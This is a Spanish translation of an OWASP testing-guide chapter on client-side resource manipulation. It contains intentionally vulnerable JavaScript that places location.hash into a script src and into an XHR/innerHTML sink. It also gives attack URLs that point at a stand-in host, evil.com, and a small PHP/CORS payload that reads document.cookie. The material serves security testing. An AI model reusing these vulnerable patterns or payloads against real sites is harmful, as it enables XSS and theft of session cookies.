# Pruebas de Manipulación de Recursos del Lado del Cliente

|ID          |
|------------|
|WSTG-CLNT-06|

## Resumen

Una vulnerabilidad de manipulación de recursos del lado del cliente es un fallo de validación de entrada. Ocurre cuando una aplicación acepta entrada controlada por el usuario que especifica la ruta de un recurso tal como el origen de un iframe, JavaScript, applet, o el manejador de un XMLHttpRequest. Esta vulnerabilidad consiste en la capacidad de controlar las URLs que enlazan a algunos recursos presentes en una página web. El impacto de esta vulnerabilidad varía, y usualmente se adopta para conducir ataques XSS. Esta vulnerabilidad hace posible interferir con el comportamiento esperado de la aplicación causando que cargue y renderice objetos maliciosos.

El siguiente código JavaScript muestra un posible script vulnerable en el cual un atacante es capaz de controlar el `location.hash` (fuente) que llega al atributo `src` de un elemento script. Este caso particular lleva a un ataque XSS ya que se podría inyectar JavaScript externo.

```html
<script>
    var d=document.createElement("script");
    if(location.hash.slice(1)) {
        d.src = location.hash.slice(1);
    }
    document.body.appendChild(d);
</script>
```

Un atacante podría atacar a una víctima haciéndola visitar esta URL:

`www.victim.com/#https://evil.com/js.js`

Donde `js.js` contiene:

```js
alert(document.cookie)
```

Esto causaría que la alerta aparezca en el navegador de la víctima.

Un escenario más dañino involucra la posibilidad de controlar la URL llamada en una solicitud CORS. Dado que CORS permite que el recurso objetivo sea accesible por el dominio solicitante a través de un enfoque basado en encabezados, el atacante podría pedir a la página objetivo que cargue contenido malicioso desde su propio sitio web.

Aquí hay un ejemplo de una página vulnerable:

```html
<b id="p"></b>
<script>
    function createCORSRequest(method, url) {
        var xhr = new XMLHttpRequest();
        xhr.open(method, url, true);
        xhr.onreadystatechange = function () {
            if (this.status == 200 && this.readyState == 4) {
                document.getElementById('p').innerHTML = this.responseText;
            }
        };
        return xhr;
    }

    var xhr = createCORSRequest('GET', location.hash.slice(1));
    xhr.send(null);
</script>
```

El `location.hash` es controlado por entrada del usuario y se usa para solicitar un recurso externo, el cual luego será reflejado a través del constructo `innerHTML`. Un atacante podría pedir a una víctima visitar la siguiente URL:

`www.victim.com/#https://evil.com/html.html`

Con el manejador del payload para `html.html`:

```html
<?php
header('Access-Control-Allow-Origin: https://www.victim.com');
?>
<script>alert(document.cookie);</script>
```

## Objetivos de Prueba

- Identificar sinks con validación de entrada débil.
- Evaluar el impacto de la manipulación de recursos.

## Cómo Probar

Para verificar manualmente este tipo de vulnerabilidad, debemos identificar si la aplicación emplea entradas sin validarlas correctamente. Si es así, estas entradas están bajo el control del usuario y podrían ser usadas para especificar recursos externos. Dado que hay muchos recursos que podrían ser incluidos en la aplicación (tales como imágenes, video, objetos, css e iframes), los scripts del lado del cliente que manejan las URLs asociadas deberían ser investigados en busca de problemas potenciales.

La siguiente tabla muestra posibles puntos de inyección (sinks) que deberían ser verificados:

| Tipo de Recurso | Etiqueta/Método                           | Sink   |
| --------------- | ----------------------------------------- | ------ |
| Frame           | iframe                                    | src    |
| Link            | a                                         | href   |
| Solicitud AJAX  | `xhr.open(method, [url], true);`          | URL    |
| CSS             | link                                      | href   |
| Imagen          | img                                       | src    |
| Object          | object                                    | data   |
| Script          | script                                    | src    |

Los más interesantes son aquellos que permiten a un atacante incluir código del lado del cliente (por ejemplo JavaScript) que podría llevar a vulnerabilidades XSS.
